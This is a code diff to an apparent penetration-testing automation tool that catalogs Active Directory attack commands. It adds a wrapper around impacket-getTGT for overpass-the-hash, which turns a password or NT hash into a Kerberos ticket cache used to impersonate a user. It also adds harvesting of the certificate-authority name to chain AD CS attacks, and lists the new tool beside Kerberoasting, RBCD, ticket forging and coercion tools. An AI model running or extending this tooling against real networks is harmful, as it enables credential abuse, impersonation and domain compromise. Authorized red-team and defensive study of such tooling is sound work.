@@ -443,6 +443,21 @@ CATALOG: list[CommandSpec] = [
         install_hint="pipx install impacket.",
     ),
     CommandSpec(
+        name="getTGT",
+        description="Request a Kerberos TGT for a user (overpass-the-hash / pass-the-key) "
+                    "and save a .ccache. Authenticate with a password OR an NT hash; then "
+                    "export KRB5CCNAME and use -k with impacket/nxc to act as that user "
+                    "over Kerberos without the plaintext.",
+        binary="impacket-getTGT", category="ad-smb",
+        parameters=_params({**_TARGET, **_DOMAIN, **_AUTH_H}, ["target", "domain", "username"]),
+        build_args=lambda k: [f"{_s(k['domain'])}/{_s(k['username'])}"
+                              + (f":{_s(k['password'])}" if k.get('password') and not k.get('hash') else "")]
+                             + (["-hashes", f":{_s(k['hash'])}"] if k.get("hash") else [])
+                             + ["-dc-ip", _s(k["target"])],
+        harvest=[HarvestRule("ccache", r"Saving ticket in\s+(\S+\.ccache)")],
+        install_hint="pipx install impacket.",
+    ),
+    CommandSpec(
         name="certipy_find",
         description="Enumerate Active Directory Certificate Services (AD CS): "
                     "CAs and certificate templates, flagging vulnerable ones "
@@ -453,6 +468,8 @@ CATALOG: list[CommandSpec] = [
                               "-p", _s(k["password"]), "-dc-ip", _s(k["target"]),
                               "-ns", _s(k["target"]), "-dns-tcp",
                               "-stdout", "-vulnerable"],
+        # harvest the CA name so certipy_req can auto-fill it (partial ADCS chaining)
+        harvest=[HarvestRule("ca", r"CA Name\s*:\s*(\S+)")],
         aliases=["certipy"], timeout=600,
         install_hint="pipx install certipy-ad (point DNS at a DC — the DC is the name server).",
     ),
@@ -854,7 +871,7 @@ _CATEGORIES = {
                "netexec_winrm", "netexec_ldap", "netexec_mssql", "enum4linux",
                "smbmap", "smbclient_shares", "ldapsearch_anon",
                "kerbrute_userenum", "asrep_roast", "kerberoast",
-               "add_computer", "rbcd", "get_st", "ticketer",
+               "add_computer", "rbcd", "get_st", "getTGT", "ticketer",
                "certipy_find", "certipy_req", "certipy_auth", "certipy_shadow",
                "coercer", "finddelegation", "targeted_kerberoast", "bloodyad",
                "dacledit", "raisechild", "lookupsid", "netexec_module",
